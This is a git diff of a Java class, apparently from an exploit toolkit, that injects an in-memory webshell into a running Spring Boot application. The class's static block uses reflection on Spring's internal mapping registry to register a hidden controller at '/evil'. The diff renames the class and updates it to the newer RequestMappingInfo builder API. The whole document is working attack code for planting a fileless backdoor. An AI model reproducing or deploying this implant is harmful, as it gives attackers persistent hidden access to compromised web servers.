@@ -1,11 +1,9 @@
-package xyz.eki.marshalexp.memshell;
+package xyz.eki.marshalexp.memshell.SpringBoot.Controller;
 
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.context.WebApplicationContext;
 import org.springframework.web.context.request.RequestContextHolder;
 import org.springframework.web.context.request.ServletRequestAttributes;
-import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
-import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
 import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
 import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
 import org.springframework.web.util.pattern.PathPatternParser;
@@ -19,7 +17,7 @@ import java.lang.reflect.Method;
 import java.util.Map;
 import java.util.Scanner;
 
-public class MSpringController2 {
+public class SpringControllerMemshell {
     static {
         String inject_uri = "/evil";
         try{
@@ -27,8 +25,6 @@ public class MSpringController2 {
             WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                     currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
             RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
-            //Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
-            //method.setAccessible(true);
 
             Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
             f.setAccessible(true);
@@ -36,7 +32,6 @@ public class MSpringController2 {
 
             Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
 
-            //Method[] ms = c.getDeclaredMethods();
 
             Field field = null;
             try {
@@ -54,26 +49,20 @@ public class MSpringController2 {
                 }
             }
 
-            Class <?> evilClass = MSpringController2.class;
+            Class <?> evilClass = SpringControllerMemshell.class;
 
             Method method2 = evilClass.getMethod("index");
-//             定义该controller的path
-            PatternsRequestCondition url = new PatternsRequestCondition(inject_uri);
-//             定义允许访问的HTTP方法
-            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
-//             构造注册信息
-            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
 
             RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
             option.setPatternParser(new PathPatternParser());
 
-//            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
+            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
 
             // 将该controller注册到Spring容器
             mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
             System.out.println("Controller Injected");
         }catch (Exception e){
-
+            e.printStackTrace();
         }
     }
 
